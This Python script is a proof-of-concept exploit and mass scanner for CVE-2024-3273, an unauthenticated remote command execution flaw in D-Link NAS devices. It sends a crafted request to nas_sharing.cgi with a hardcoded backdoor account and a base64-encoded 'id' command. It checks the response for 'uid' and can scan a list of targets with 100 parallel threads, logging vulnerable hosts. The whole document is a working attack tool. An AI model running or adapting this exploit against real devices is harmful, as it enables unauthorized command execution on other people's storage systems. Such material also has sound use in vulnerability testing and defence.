#【CVE-2024-3273】D-Link NAS 未授权RCE漏洞
import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'
def banner():
    text='''                             
,-.----.     ,----..      ,---,. 
\    /  \   /   /   \   ,'  .' | 
;   :    \ |   :     :,---.'   | 
|   | .\ : .   |  ;. /|   |   .' 
.   : |: | .   ; /--` :   :  |-, 
|   |  \ : ;   | ;    :   |  ;/| 
|   : .  / |   : |    |   :   .' 
;   | |  \ .   | '___ |   |  |-, 
|   | ;\  \'   ; : .'|'   :  ;/| 
:   ' | \.''   | '/  :|   |    \ 
:   : :-'  |   :    / |   :   .' 
|   |.'     \   \ .'  |   | ,'   
`---'        `---`    `----'     
                                 
                                                 
                                version:CVE-2024-3273 1.0
                                Author: Laow🚦
'''
    print(text)

def main():
    banner()
    parser = argparse.ArgumentParser(description="D-Link NAS 未授权RCE漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    # print(args.url)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ="
    url = target + url_payload
    # print(url)
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)", 
        "Accept-Encoding": "identity", 
        "Accept": "*/*", 
        "Connection": "keep-alive"
        }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    
    try:
        response = requests.get(url=url,headers=headers,proxies=proxies,timeout=5)
        if response.status_code == 200 and 'uid' in response.text:
            print(f"{GREEN}[+] {url} 存在RCE漏洞！{RESET}")
            with open('result.txt','w')as f:
                f.write(target+'\n')
                return True
        else:
            print("[-]漏洞不存在")
            return False
    except Exception:
        return("站点存在问题！！")
            

if __name__ == '__main__':
    main()
